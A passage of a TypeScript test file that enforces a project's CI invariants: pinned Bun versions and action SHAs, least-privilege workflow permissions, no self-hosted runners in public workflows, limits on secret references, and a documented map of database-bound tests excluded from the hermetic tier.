/**
 * Tripwire (DEC-12): the CI wiring's invariants hold — the workflow YAMLs are
 * plain config nobody type-checks, so each rule below is enforced here or it
 * silently rots (engineering/CI.md).
 *
 *   1. Bun pin — every GitHub workflow using setup-bun pins via
 *      `bun-version-file: .bun-version` (never an inline version), and the
 *      tier job on both hosts runs the ONE locked CI image (ci/image.json) as
 *      uid 1001, and a tier running IN the image runs one built from THIS
 *      checkout's sha256(ci/Dockerfile ++ .bun-version) — the image installs
 *      exactly .bun-version (rule 1b). The pin is load-bearing: Bun.sql
 *      jsonb-inference drift is a data-corruption class.
 *  1c. THE CI IMAGE CARRIES WHAT SHIPS (2026-10-02) — every package the product
 *      `Dockerfile` apt-installs is apt-installed by `ci/Dockerfile` too, MEASURED
 *      from both files (never a typed list), minus CI_IMAGE_MISSING_PACKAGES: a
 *      shrink-only list, each entry with its reason. The AVIF encoder
 *      (libheif-plugin-aomenc) was in neither, then in the product image only for a
 *      day — a media gate on the hosts measured a toolchain that does not ship.
 *   2. Oracle honesty — every self-hosted workflow that runs test/parity or
 *      scripts/verify.ts sets ORACLE_REQUIRED: "1", so an absent PHP oracle is
 *      a RED canary, never a silent green (the AGENTS.md "oracle trap").
 *   3. No hermetic drift — the GitHub hermetic jobs AND .gitlab-ci.yml all
 *      invoke the shared scripts/ci/hermetic.sh (one source of truth), and
 *      hermetic.sh's tripwire list stays a SUBSET of scripts/verify.ts
 *      TRIPWIRES (the hosted tier may run fewer gates, never unknown ones).
 *   4. Tripwire index integrity — scripts/verify.ts TRIPWIRES equals the
 *      engineering/TRIPWIRES.md rows exactly (the 12-vs-14 drift found
 *      2026-07-09 stays fixed), and every listed test file exists.
 *   5. PUBLIC-REPO POSTURE (2026-07-11) — NO self-hosted job may live in
 *      .github/workflows/. dedalia-org/dedalo is PUBLIC: anyone can fork it and
 *      open a PR, and a `runs-on: self-hosted` job would execute that fork's
 *      code on the Mac holding the real ../private/.env and the live matrix
 *      Postgres — RCE on the data host. The self-hosted tier is preserved,
 *      inert, in .github/workflows-selfhosted/ (GitHub executes only
 *      .github/workflows/) for a PRIVATE mirror. This was prose in CI.md and
 *      prose does not stop a paste; now it is a gate.
 *   7. LEAST PRIVILEGE (2026-08-03) — every workflow declares a top-level
 *      `permissions:` block. With none, the job inherits the REPOSITORY default,
 *      which on a repo created before GitHub changed the default is read/WRITE on
 *      contents — ambient push rights granted to every step, including third-party
 *      actions, in jobs that write nothing back.
 *   8. PINNED ACTIONS (2026-08-03) — every `uses:` names a 40-hex commit SHA, with
 *      the human version in a trailing comment. `@v5` is a MOVING TAG the action's
 *      owner can repoint at any commit: the pin is the difference between "we chose
 *      this code" and "we run whatever that repo publishes today", and the deploy
 *      workflow hands one of these actions an SSH key.
 *   9. CODEQL PAIRING (2026-08-03) — every `github/codeql-action/*` step is pinned
 *      to the SAME SHA. init and analyze are one dependency (init writes the database
 *      analyze reads); Dependabot models them as two and WILL propose splitting them.
 *  10. STATUS-PROSE (2026-08-18) — no row of engineering/TRIPWIRES.md narrates a
 *      transient red/failing state as a standing fact (scripts/lib/status_prose.ts
 *      is the ONE detector; see its header for what pairs a status word with an
 *      instance marker and why bare rule wording stays legal). A row states what
 *      its gate ASSERTS; how the gate is doing at some moment belongs in
 *      rewrite/LEDGER.md or in the commit message. Narrated red in the index
 *      becomes the expected condition and trains the regeneration reflex the
 *      ratchets exist to starve — and it was never load-bearing: rule 4's parser
 *      takes only the first column, and scripts/verify.ts has no allowlist.
 *  11. NO SECRET IN THE EXECUTED TIER — ONE CARVE-OUT (2026-08-25; carve-out
 *      2026-10-09) — no `${{ secrets.X }}` in .github/workflows/, EXCEPT the publish
 *      job of image-release.yml: the reference must sit in the job that declares
 *      `environment: image-release` (owner-protected: deployment policy + reviewers),
 *      X must be a name engineering/image_registries.json declares
 *      (`declaredSecretNames`, never a list kept here), and that workflow may have no
 *      pull_request / pull_request_target / workflow_run / schedule trigger. Docker
 *      Hub has no OIDC push federation and a self-hosted registry needs a robot
 *      token, so a mirror is impossible without a secret — the carve-out is exactly
 *      that wide and is judged by `secretReferenceFaults`, with a planted control
 *      for each way out of it.
 *  13. HOSTED TIERS NEED NO PRIVATE ENV (2026-08-25; generalized 2026-09-02 to
 *      every script an executing workflow runs, following `source` lines) —
 *      scripts/ci/db_tier.sh may contain NO command that requires ../private/.env. Its own header states
 *      the tier needs "no secrets, no ../private/.env, no sibling tree", but the
 *      script called env_guard.sh, whose check 2 hard-fails on a missing
 *      ../private/.env — so on every GitHub run the tier died BEFORE
 *      `bun run test:db:setup`, and its tripwires were "wired" but had never
 *      once executed there. "Wired" must never again quietly mean "never
 *      reached", so the incompatibility is now a scan with a positive control,
 *      not a prose claim.
 *  14. DIFFUSION TABLE OVERRIDES CARRY THE ENGINE'S PREFIX (2026-08-25) — every
 *      literal assigned to DIFFUSION_JOBS_TABLE / DIFFUSION_ACTIVITY_TABLE under
 *      scripts/ and test/ matches the engine's own /^dedalo_ts_test_…/ guard,
 *      which THROWS AT MODULE LOAD (src/diffusion/jobs/schema.ts,
 *      src/core/diffusion_bridge/diffusion_delete.ts). db_tier.sh exported
 *      `dedalo_ts_ci_*` names — latent only because no db-tier gate imported
 *      schema.ts yet; adding one (diffusion_jobs_table_seam.test.ts statically
 *      imports it) would have killed the whole tier at import. The regex is
 *      EXTRACTED from the two engine sources, never re-typed here.
 *  17. TIME-BASED CHECKS HAVE A NIGHTLY HOME (2026-09-26) — hermetic.sh may defer
 *      the checks whose input is the CALENDAR (the dependency-audit stage runs only
 *      on a lockfile/vendor change, `--changed-since`; vendor_advisory_tripwire's
 *      window/expiry legs are dropped by DEDALO_VENDOR_DATED_CHECKS=0) only while
 *      .github/workflows/nightly.yml runs them unconditionally: scheduled, forced,
 *      network-required, its red carried to the run's verdict, reported by the ONE
 *      job holding `issues: write` — a job that runs no repository code. Rule 7d
 *      widened with it (job/step outputs, the `- run:` spelling), and rule 12 now
 *      reads the inline `container:` spelling the tiers are moving to.
 *  18. THE AUDIT'S SKIP BASE COVERS THE WHOLE PUSH (2026-09-26) — the deferral
 *      in rule 17 is honest only if "the push changed no audit input" is judged
 *      over EVERY commit the push carries. hermetic.sh's `audit_reference` is
 *      EXECUTED in a scratch repository (a three-commit push, the lockfile bump in
 *      the FIRST commit): it must name the pre-push tip, so the diff sees the
 *      bump; a new branch (all-zero `before`), a missing payload, a non-sha and
 *      an unfetchable sha must resolve to NOTHING (audit.ts runs). An outcome,
 *      not a spelling: HEAD^ — the defect this replaced — fails the first leg.
 *  19. ONE VERIFICATION PER SHA, NEVER LESS (2026-09-26) — `bun run push` lands one
 *      sha on both landing branches, and ci.yml/db.yml ran every tier twice on it.
 *      Each now opens with a `dedupe` job whose output lets the tier jobs skip; the
 *      skip is a green check, so what may produce it is held here by OUTCOME: the
 *      probe script is EXECUTED by bash against a stubbed `gh` and must say skip=true
 *      ONLY on a push, ONLY when a push run of the same workflow on ANOTHER branch
 *      CONCLUDED success for the SAME sha — whatever its run id (serialization, not id
 *      order, decides which run defers) — never for a PR or a dispatch, the same
 *      branch, a red run, a run still going, another sha — and must fail OPEN (skip=
 *      false, exit 0) when the API does. Around it: the job exists in both files and
 *      is byte-identical there, holds only `actions: read`, runs no action (no
 *      checkout — it executes no repository code), is itself unconditioned, and every
 *      other job of the file needs it; push runs are grouped by SHA and never
 *      cancelled, so the second run of a sha waits for the first to CONCLUDE instead
 *      of deferring to one still running, while a PR is keyed by ref and any other
 *      event by its own run id (a dispatch sharing the sha group would EVICT the
 *      queued push run). Which `if:` a tier job may carry — including that a FAILED
 *      dedupe runs the tiers — is tier_wiring_tripwire leg F's (evaluated there).
 *
 * SCANNERS THAT ARE NOT GATED HERE, deliberately: CodeQL (.github/workflows/codeql.yml)
 * and the secret scan (.github/workflows/security.yml) are third-party analyses whose
 * rulesets we do not control. Their WIRING is checked by the two rules above like any
 * other workflow; their FINDINGS are not this file's business.
 *
 * EVERY path this gate reads is version-controlled, so it runs on a bare clone.
 * The index moved out of rewrite/LEDGER.md on 2026-07-11 for exactly that
 * reason: rewrite/ is internal process and is not in the repo.
 */

import { describe, expect, test } from 'bun:test';
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Glob } from 'bun';
import { PACKAGES } from '../../scripts/ci/audit.ts';
import {
	CI_IMAGE_LEGACY,
	CI_IMAGE_NAME,
	CI_IMAGE_NAME_PATTERN,
	CI_IMAGE_REF,
	CI_IMAGE_REFERENCES,
	ciImageFingerprint,
	lockedImageRef,
	readCiImageLock,
} from '../../scripts/lib/ci_image.ts';
import { findStatusProse } from '../../scripts/lib/status_prose.ts';
import { CONFIG_CATALOG } from '../../src/config/catalog/index.ts';
import {
	declaredSecretNames,
	loadImageRegistries,
} from '../../src/core/update/image_registries.ts';

const repoRoot = join(import.meta.dir, '..', '..');
const read = (rel: string) => readFileSync(join(repoRoot, rel), 'utf8');

/**
 * THE ISOLATED DAEMON PACKAGES, DERIVED — never a list kept here. A daemon package is a
 * locked package (scripts/ci/audit.ts `PACKAGES`: every package.json with a sibling
 * bun.lock) other than the root, that carries its OWN bunfig.toml — a Bun program with its
 * own test configuration, gated by its own install + tsc + suite. The site template
 * (publication/site_builder/templates/basic) locks but has no bunfig: a vite toolchain
 * copied into generated sites, not a daemon. Rules 11, 11b and 15 hold every place a
 * daemon package must be wired to THIS set, so the next package is red the day its
 * lockfile lands instead of silently unrun. The hand lists they replace said "exactly
 * two", and a third package (publication/host_agent) had to edit around each of them.
 */
const DAEMON_PACKAGES: readonly string[] = PACKAGES.filter(
	(root) => root !== '.' && existsSync(join(repoRoot, root, 'bunfig.toml')),
);

/**
 * Every package a Dockerfile's `apt-get install` lines name (rule 1c). Comment lines
 * are dropped first (both Dockerfiles DISCUSS apt-get in their headers), `\`-newline
 * continuations are joined, and a command's arguments end at `&&`, `;` or the end of
 * the joined line; flags are not packages. Pure, so the positive control below can
 * prove it reads both spellings the two files use.
 */
function aptInstalledPackages(dockerfile: string): Set<string> {
	const joined = dockerfile
		.split('\n')
		.filter((line) => !/^\s*#/.test(line))
		.join('\n')
		.replace(/\\\n/g, ' ');
	const packages = new Set<string>();
	for (const m of joined.matchAll(/\bapt-get\s+install\b([^\n;&]*)/g)) {
		for (const token of (m[1] ?? '').split(/\s+/)) {
			if (token.length > 0 && !token.startsWith('-')) packages.add(token);
		}
	}
	return packages;
}

/**
 * Product-image packages the CI image does NOT carry yet — SHRINK-ONLY, each with
 * its reason. An image change moves the fingerprint, so adding one is the publish
 * flow (side branch → ci-image.yml → `bun run ci:image:pin`, Dockerfile + pin in ONE
 * commit; engineering/CI.md "The pin"), never a hermetic-red edit of ci/Dockerfile.
 */
// Empty since 2026-10-03: ocrmypdf (the last row) is in ci/Dockerfile, and the OCR
// door now has a real-binary leg (test/unit/media_engine.test.ts).
const CI_IMAGE_MISSING_PACKAGES: Record<string, string> = {};

const yaml = (f: string) => f.endsWith('.yml') || f.endsWith('.yaml');

/**
 * A job actually TARGETS the self-hosted runner — i.e. a `runs-on:` directive names
 * it. Deliberately NOT a substring scan: these files must be free to *discuss*
 * self-hosted in their headers (the whole public-repo posture is documented there),
 * and a naive includes('self-hosted') would flag the warning that prevents the bug.
 */
const targetsSelfHosted = (src: string) => /^\s*runs-on:.*self-hosted/m.test(src);

/** EXECUTED by GitHub — the public tier. Hermetic only (rule 5). */
const workflowDir = join(repoRoot, '.github', 'workflows');
const workflowFiles = readdirSync(workflowDir).filter(yaml);

/**
 * INERT on the public repo — the self-hosted tier, kept for the private mirror.
 * GitHub executes ONLY .github/workflows/, so these never run here; that
 * structural fact IS the protection (they hold no secrets — only `${{ secrets.X }}`
 * names, which are meaningless without the secret).
 *
 * NOT existsSync-guarded, deliberately: these files must stay VERSION-CONTROLLED.
 * If they were gitignored or deleted, a soft guard would make the pin/oracle rules
 * below pass VACUOUSLY over an empty list — the silent-narrowing trap. readdirSync
 * throws instead, so removing the tier is a LOUD red, and the mirror (which is a
 * push of this repo) keeps receiving them.
 */
const selfHostedDir = join(repoRoot, '.github', 'workflows-selfhosted');
const selfHostedFiles = readdirSync(selfHostedDir).filter(yaml);

/** Every workflow YAML, wherever it lives: the pin + oracle rules bind to both tiers. */
const allWorkflows: Array<{ rel: string; src: string }> = [
	...workflowFiles.map((f) => ({ rel: join('.github', 'workflows', f), src: '' })),
	...selfHostedFiles.map((f) => ({ rel: join('.github', 'workflows-selfhosted', f), src: '' })),
].map((w) => ({ ...w, src: read(w.rel) }));

/** verify.ts TRIPWIRES entries (the quoted test paths inside the array). */
function verifyTripwires(): string[] {
	const src = read('scripts/verify.ts');
	const block = src.match(/const TRIPWIRES = \[([\s\S]*?)\];/)?.[1];
	if (!block) throw new Error('scripts/verify.ts: TRIPWIRES array not found');
	return [...block.matchAll(/'(test\/[^']+\.test\.ts)'/g)].map((m) => m[1] as string);
}

/** hermetic.sh HERMETIC_TRIPWIRES entries. */
function hermeticTripwires(): string[] {
	const src = read('scripts/ci/hermetic.sh');
	// Terminate at a LINE-START ')', not the first ')' anywhere: section comments
	// inside the array legitimately contain parentheses, and a non-greedy match
	// stopped dead at the first one. Measured 2026-08-24: that truncation hid 20
	// of the 41 entries from this gate — the rule guarding the hermetic list was
	// itself only checking half of it, silently, since 2026-08-03.
	const block = src.match(/HERMETIC_TRIPWIRES=\(\n([\s\S]*?)\n\)/)?.[1];
	if (!block) throw new Error('scripts/ci/hermetic.sh: HERMETIC_TRIPWIRES array not found');
	// Entries only: a path must BE the line, so a path mentioned inside a comment
	// is not mistaken for a wired gate.
	return block
		.split('\n')
		.map((line) => line.trim())
		.filter((line) => line !== '' && !line.startsWith('#'))
		.map((line) => {
			const m = line.match(/^(test\/[^\s]+\.test\.ts)$/);
			if (!m)
				throw new Error(`scripts/ci/hermetic.sh: unparsable HERMETIC_TRIPWIRES line: ${line}`);
			return m[1] as string;
		});
}

/**
 * db_tier.sh DB_TIER_TRIPWIRES entries — the hosted DB tier's list.
 *
 * Same parsing discipline as hermeticTripwires() above, for the same measured
 * reason: terminate at a LINE-START ')' — a '(' inside a section comment
 * silently truncated the hermetic array at 21 of its 41 entries from 2026-08-03
 * to 2026-08-24, so the rule guarding that list was checking half of it — and a
 * path must BE the line, so a path named inside a comment is never mistaken for
 * a wired gate.
 *
 * NOT existsSync-guarded, deliberately: read() throwing ENOENT on a missing
 * db_tier.sh IS the loud red. A soft guard would let rule 3c pass vacuously over
 * an empty list, which is exactly the runs-on-no-tier state the rule forbids.
 */
function dbTierTripwires(): string[] {
	const src = read('scripts/ci/db_tier.sh');
	const block = src.match(/DB_TIER_TRIPWIRES=\(\n([\s\S]*?)\n\)/)?.[1];
	if (!block) throw new Error('scripts/ci/db_tier.sh: DB_TIER_TRIPWIRES array not found');
	return block
		.split('\n')
		.map((line) => line.trim())
		.filter((line) => line !== '' && !line.startsWith('#'))
		.map((line) => {
			const m = line.match(/^(test\/[^\s]+\.test\.ts)$/);
			if (!m) throw new Error(`scripts/ci/db_tier.sh: unparsable DB_TIER_TRIPWIRES line: ${line}`);
			return m[1] as string;
		});
}

/**
 * THE HOSTED TIER SCRIPTS — DERIVED from the executing workflows, never a hand list.
 *
 * Rules 6 and 13 used to iterate `['scripts/ci/hermetic.sh', 'scripts/ci/db_tier.sh']`.
 * A third hosted tier (scripts/ci/instance_tier.sh, 2026-09-02) would then have been
 * held to none of them until somebody remembered the list — the rot every derived
 * census in this repo exists to prevent. So the set is read off the `run:` lines of
 * .github/workflows/*.yml and the script lines of .gitlab-ci.yml: a script an
 * executing workflow runs is a hosted tier, and inherits every rule below on the day
 * it is wired. (test/unit/tier_wiring_tripwire.test.ts holds the converse — that every
 * scripts/ci/*.sh IS reached from such a chain or carries a reason.)
 */
function hostedTierScripts(): string[] {
	const roots = [...workflowFiles.map((f) => join('.github', 'workflows', f)), '.gitlab-ci.yml'];
	const found = new Set<string>();
	for (const rel of roots) {
		for (const m of read(rel).matchAll(
			/^\s*(?:-\s+|run:\s+)bash (scripts\/ci\/[a-z0-9_]+\.sh)\b/gm,
		)) {
			found.add(m[1] as string);
		}
	}
	const scripts = [...found].sort();
	// Anti-vacuity: the two tiers this file has always known must still be found, or
	// the grammar drifted and every rule below is iterating an empty list.
	for (const known of ['scripts/ci/hermetic.sh', 'scripts/ci/db_tier.sh']) {
		if (!scripts.includes(known)) {
			throw new Error(
				`hostedTierScripts(): ${known} not found on any executing workflow's run: line — the derivation is blind`,
			);
		}
	}
	return scripts;
}

/**
 * A tier script's EFFECTIVE text: itself plus every scripts/ci/*.sh it `source`s,
 * transitively. The environment composition moved out of db_tier.sh into
 * scripts/ci/hosted_env.sh (one copy for the db and instance tiers), so a rule that
 * read db_tier.sh alone would now find no stub, no allowlist — and report the tier
 * broken, or, with a laxer grammar, report nothing. Only a LINE-START `source` (or
 * `.`) counts: a `# shellcheck source=` comment is not an inclusion.
 */
function effectiveSource(rel: string, seen: Set<string> = new Set()): string {
	if (seen.has(rel)) return '';
	seen.add(rel);
	const src = read(rel);
	let out = src;
	for (const m of src.matchAll(
		/^\s*(?:source|\.)\s+"?(?:\$REPO_ROOT\/)?(scripts\/ci\/[a-z0-9_]+\.sh)"?/gm,
	)) {
		out += `\n${effectiveSource(m[1] as string, seen)}`;
	}
	return out;
}

/** The hosted tier scripts that BUILD the suite database — the ones whose environment must be complete. */
function suiteBuildingTiers(): string[] {
	return hostedTierScripts().filter((rel) =>
		/^\s*bun run test:db:setup\b/m.test(effectiveSource(rel)),
	);
}

/**
 * Rule 13's matcher — the lines of a shell script that REQUIRE ../private/.env.
 *
 * Three shapes count, each one a way db_tier.sh could re-acquire the dependency
 * its header forswears:
 *   - any non-comment line naming `../private/.env` itself (reading, sourcing,
 *     testing it — the file must not be needed, so it must not be named);
 *   - an env_guard.sh invocation WITHOUT --no-private-env (check 2 of that
 *     guard hard-fails on the missing file — the exact line that killed the
 *     tier on every GitHub run until 2026-08-25);
 *   - any link_siblings.sh invocation (its whole job is materializing the
 *     sibling ../private tree — a hosted runner has no sibling to link).
 *
 * Comment lines are exempt: the header DISCUSSES ../private/.env (it documents
 * why the tier does not need it), and flagging the warning that prevents the
 * bug is the trap rule 5's targetsSelfHosted() already refuses to fall into.
 * `mkdir -p ../private` stays legal — it creates the parent directory the suite
 * media root derives under, and never touches the .env file.
 *
 * What this does NOT prove: that no INVOKED program reads the file on its own.
 * `bun run test:db:setup` runs fine without it because the script exports the
 * full config into the process env (rule 6 pins that stub list to the catalog);
 * a future subcommand that insists on the file would pass this scan and die at
 * runtime — loudly, in CI, which is the failure mode this rule downgraded the
 * silent never-ran state to.
 */
function privateEnvOffenders(src: string): string[] {
	const offenders: string[] = [];
	for (const raw of src.split('\n')) {
		const line = raw.trim();
		if (line === '' || line.startsWith('#')) continue;
		if (line.includes('../private/.env')) offenders.push(line);
		else if (/\benv_guard\.sh\b/.test(line) && !line.includes('--no-private-env'))
			offenders.push(line);
		else if (line.includes('link_siblings.sh')) offenders.push(line);
	}
	return offenders;
}

/**
 * Rule 14's regex source: extract the seam-override guard regex FROM the two
 * engine modules rather than re-typing it. This gate cannot import them — both
 * drag src/core/db/postgres.ts into the closure, and resolveJobsTable() runs at
 * module load, which would disqualify this file from the hermetic tier (the
 * exact NOT_HERMETIC criterion several rows above document) — so the next-best
 * mechanical bond is reading their SOURCE: if either regex changes shape or the
 * two modules disagree, this throws and the rule goes red instead of silently
 * validating against a stale copy.
 */
function diffusionSeamGuardRegex(): RegExp {
	const sources = [
		'src/diffusion/jobs/schema.ts',
		'src/core/diffusion_bridge/diffusion_delete.ts',
	] as const;
	const literals = sources.map((rel) => {
		const m = read(rel).match(/if \(!(\/\^[^/]+\/)\.test\(override\)\)/);
		if (!m) throw new Error(`${rel}: seam-override guard regex not found — rule 14 is now blind`);
		return m[1] as string;
	});
	if (new Set(literals).size !== 1) {
		throw new Error(
			`the two seam-guard regexes disagree (${literals.join(' vs ')}) — they are one contract and must move together`,
		);
	}
	const literal = literals[0] as string;
	return new RegExp(literal.slice(1, -1));
}

/** engineering/TRIPWIRES.md table rows (first column, test paths). */
function ledgerTripwires(): string[] {
	const src = read('engineering/TRIPWIRES.md');
	const rows = [...src.matchAll(/^\| (test\/[^\s|]+\.test\.ts) \|/gm)].map((m) => m[1] as string);
	if (rows.length === 0) throw new Error('engineering/TRIPWIRES.md: no tripwire rows found');
	return rows;
}

/**
 * Rule 3c — tripwires that do NOT run on the hermetic tier. Each row is an
 * ASSIGNMENT, not an excuse: the reason says why the gate cannot run DB-less,
 * and the gate MUST also appear in scripts/ci/db_tier.sh DB_TIER_TRIPWIRES (the
 * hosted DB tier, .github/workflows/db.yml). The two lists are asserted EQUAL,
 * so "excused from hermetic" can never again quietly mean "runs nowhere".
 *
 * This began as the CONVERSE of the subset rule below it, because that rule
 * alone is a one-way silence: for months a tripwire could be added to verify.ts,
 * never wired into hermetic.sh, and run on NO executing tier while every gate
 * stayed green. Measured 2026-08-24: the index
 * held 89 gates and hermetic.sh 41 — and five more landed that same day, taking
 * the unrun set from 48 to 53, with nothing red at any point.
 *
 * The map is exact in BOTH directions: an unlisted exclusion is red (the new
 * gate must be wired hermetically or ASSIGNED to the DB tier — a reason alone no
 * longer suffices) and a stale entry is red too (a listed gate
 * that now runs hermetically, or that is no longer a tripwire at all).
 *
 * Every entry below is a DB-tier gate — verified by reading its closure, not its
 * name. To move one here it is not enough that it looks pure: hermetic.sh's
 * standing rule is that an entry is EMPIRICALLY re-verified with DB_PORT closed
 * before being added.
 */
const NOT_HERMETIC: ReadonlyMap<string, string> = new Map([
	[
		'test/unit/restore_door_native.test.ts',
		'It pg_dumps the whole suite database into a real custom-format archive and drives the door against a scratch Postgres database (CREATE/RENAME/DROP DATABASE, pg_restore, a held psql backend, the real reconcile plan through the pool), so without Postgres + pg_dump/pg_restore the describe.if skips 10 of 12 tests loudly and only the plan-totality and identifier-grammar legs run',
	],
	[
		'test/unit/unpublish_debt_native.test.ts',
		'Every leg drives the real dd1758 ledger, the zzd diffusion ontology and a real record delete on the suite Postgres (describe.if(DB_READY) skips all 5 cases on a closed port)',
	],
	[
		'test/unit/suite_mariadb_target_native.test.ts',
		"Its live legs install, start and drive THIS lane's own suite mariadbd (a --skip-networking unix socket under ../private/test_mariadb/<lane>, per-database grants, the marker schema) and read its USER_STATISTICS; the hermetic tier builds no server, while db_tier.sh starts that server before its gates and its EXIT trap stops it",
	],
	[
		'test/unit/shard_mariadb_sweep_native.test.ts',
		"sweepShardClones enumerates shard clones and their vector twins through psql on the suite Postgres cluster and the vector server before it sweeps the planted suite MariaDB lane roots, so without a live cluster the sweep throws at its first enumeration; its only other executors are the unit stage (one of ~1000 files in one pass) and the MariaDB tier's no-contact batch, which never judges a failed case",
	],
	[
		'test/unit/diffusion_frontier_scope_native.test.ts',
		'It runs the real resolver over the zzdif domain records and the ACL identity fixture on the suite Postgres (describe.if(DB_READY) skips both cases on a closed port)',
	],
	[
		'test/unit/diffusion_seed_compiles_native.test.ts',
		"It compiles the real dd_ontology of the suite database — the ontology index, every dd1190 domain's virtual tree and inspectOntology's drift all read matrix_ontology/dd_ontology, and the migration-recorded check reads dedalo_ts_schema_migrations",
	],
	[
		'test/unit/raw_roundtrip_native.test.ts',
		'Every case builds the zzarc situation on the suite database and restores into it after a real drop; with the port closed all 9 cases SKIP via describe.if(DB_READY)',
	],
	[
		'test/unit/conform_locator_existence_native.test.ts',
		'The gate extracts from and restores into the suite database (a second, outside-only situation plays the destination); with the port closed all 5 cases SKIP via describe.if(DB_READY)',
	],
	[
		'test/unit/tool_lossless_writeback_tethers_native.test.ts',
		'It builds the zzlwt situation on the suite database and runs translateAndWrite, toolTimeMachineBulkRevert and pollTranscriptionCompletion on its records (assertTestDatabase in beforeAll), so without Postgres every case fails in beforeAll',
	],
	[
		'test/unit/write_obligations_native.test.ts',
		"Every case drives a real write door on the suite database (matrix_test rows, matrix_activity rows, matrix_time_machine, the observer recompute's SQL) and is describe.if(DB_READY)-gated, so without Postgres the file is 13 skips and asserts nothing",
	],
	[
		'test/unit/value_law_agreement_native.test.ts',
		'It builds a zzvl scratch ontology + records on the suite database and drives saveComponentData, dispatchRqo, the derived-store probes and the live relation-index trigger against Postgres',
	],
	[
		'test/unit/reconcile_registry_native.test.ts',
		'Every registered reconcile is run dry against the suite database and suite media root on situations the file builds (zzrc/zzro/zzrh scratch TLDs, the zzot observer seed, the suite RAG database, the .publication marker store), so it needs the suite Postgres and the vector database',
	],
	[
		'test/unit/concurrency_interleave.test.ts',
		'Four of its six layers are DB-backed by construction: the resolver reads a real section in two languages, the grid-columns and tools-registry caches are built from real ontology rows, and the ISO-02 core-cache regression (P2-35) resolves a real element through buildStructureContext at two permission levels. The whole file is about what a LONG-LIVED PROCESS holds between requests, and a mocked store holds nothing',
	],
	[
		'test/unit/remove_sentinel_native.test.ts',
		"The refusal it gates is only meaningful against real stored data: it saves a component in several languages through the real save door, then sends an id-less `remove` and asks the DATABASE what survived — the column, the item-id counter in `meta` and the time-machine tail must all be byte-unchanged, and `action:'clear'` must empty every language AND be audited. A mocked store would prove nothing about the wipe this gate exists to prevent",
	],
	[
		'test/unit/marc_identity_native.test.ts',
		"Its whole point is behavioural: it creates real records carrying a real code component, imports a MARC file whose control number matches, and asserts the row landed on the RIGHT record — plus the destructive control, that a control number equal to another record's section_id does not write to that record. None of that exists without the suite database",
	],
	[
		'test/unit/account_revocation_native.test.ts',
		'Every assertion is about what a REAL write did to real state: it inserts dd128 records through the counter-allocating writer, logs them in, applies each of the five account transitions (and the record delete) through a real door, drives the two SEC-14 raw admin routes through handleRequest / handleCountersRequest against the live Principal, and then asks the session store and the media marker directory what survived — with the DB port closed 35 of its 40 legs are red, and a revocation gate that mocked either surface would prove nothing about the property it exists to hold',
	],
	[
		'test/unit/dd128_write_census_tripwire.test.ts',
		"Its census legs read source and are pure, but the behavioural leg (GATE-24) mints a scratch dd234 profile and a scratch dd128 user, resolves a real principal carrying level 2 on (dd128, dd1725), and drives tool_propagate_component_data at that principal's own record to prove the refusal WORKS — an authorization decision may not rest on a source substring, and none of that exists without the suite database",
	],
	[
		'test/unit/client_idempotency_tripwire.test.ts',
		'Its structural legs are pure, but the end-to-end leg drives the real create door twice under one idempotency key and asserts the RECORD COUNT is unchanged — the only assertion that proves the server honours the key rather than merely receiving it — so it needs the suite database',
	],
	[
		'test/unit/export_gate_b_native.test.ts',
		'It drives the real get_export_grid handler as a principal resolved from dd128/dd234 rows against a record it mints with a dd153 project locator, and asserts what the export actually EMITTED — every refusal and the one authorized cell alike are statements about rows the projects filter selected, unobservable without the suite database',
	],
	[
		'test/unit/search_path_acl_native.test.ts',
		'It builds a multi-hop filter as a scoped principal and asserts both the generated SQL per join alias AND a behavioural hit/miss probe against records it writes, so the oracle-closing half cannot be evaluated without a live Postgres',
	],
	[
		'test/unit/frontier_class_native.test.ts',
		'The class probe writes the hidden record twice, once per sentinel, across all three frontier surfaces and compares the scoped answers byte-for-byte while requiring the admin pair to differ — it is entirely a statement about stored rows',
	],
	[
		'test/unit/csv_parser_conformance_native.test.ts',
		'The fixture table is pure, but the duplicate-section_id case and both door-refusal cases drive the real import_files handler against matrix_test — a row must be created, then updated, and read back — so the gate cannot run on a runner with no suite database',
	],
	[
		'test/unit/ingest_encoding_tripwire.test.ts',
		'It drives get_csv_files and import_files end to end with CP1252 bytes and reads the stored value back, so the conversion is proved on the record rather than on the decoder in isolation; without the suite database there is nothing to read back',
	],
	[
		'test/unit/write_lang_provenance_native.test.ts',
		'Every door in its derived census is exercised by writing a real record under a session data language and reading the stored slice lang back out of the matrix; the refusal cases assert no transaction was opened, which requires a live connection to observe',
	],
	[
		'test/unit/bulk_process_id_tripwire.test.ts',
		'It asserts what a bulk executor WROTE — that every Time Machine row carries a non-null bulk_process_id and that a failed dd800 mint leaves no orphan row — which is a statement about database rows and is unobservable without them',
	],
	[
		'test/unit/delete_inverse_lost_update_native.test.ts',
		'Its whole subject is a CROSS-CONNECTION lost update: it opens two Postgres sessions, holds one transaction open on the owner row and polls pg_blocking_pids until the delete is provably waiting on that lock, so there is nothing left of the gate without a live suite database — on a bare runner every case would fail at connect, not skip, and the invariant would be untestable rather than merely unrun',
	],
	[
		'test/unit/duplicate_record_dataframe_native.test.ts',
		'It builds a host record, its dataframe frame targets and a non-admin principal through the engine own write path and then duplicates them, asserting what the copied locators POINT AT across matrix tables; every assertion reads rows back out of the suite database, so the gate cannot run on the hosted tier',
	],
	[
		'test/unit/dataframe_delete_policy_native.test.ts',
		'It builds a scratch ontology situation (dd_ontology nodes) plus host, frame-target and portal-target records in the suite database, removes frames through the engine own write path on three doors and asserts what happened to the target ROWS and their Time Machine snapshots — including the commit-lane ordering inside a real outer transaction — so there is nothing to run without a live suite database',
	],
	[
		'test/unit/tm_lang_slice_restore_native.test.ts',
		'It materializes a scratch ontology (zztmlang) and multilingual records through saveComponentData, drives both Time-Machine restore doors and reads matrix_time_machine rows back as stored jsonb text to prove untouched languages survive byte-identical — all of it database state, none of it reachable without the suite Postgres',
	],
	[
		'test/unit/consultation_only_sections_tripwire.test.ts',
		'The engine-guard refusals resolve pre-DB but the readSection end-to-end leg and the ontology-backed permission/structure lookups query the suite Postgres, so the gate cannot run on the hosted tier',
	],
	[
		'test/unit/dbread_role_tripwire.test.ts',
		'Its entire subject is a database object — it connects AS the dedalo_test_ro role and fires zero-row write probes that Postgres must refuse with 42501; without a live suite DB every test skips (empirically verified DB_HOST=127.0.0.1 DB_PORT=1: 5 skip / 0 pass), so on the hermetic tier the gate would be 100% skip, i.e. vacuous — it runs on the DB tier, where test:db:setup step 5b has just ensured the role',
	],
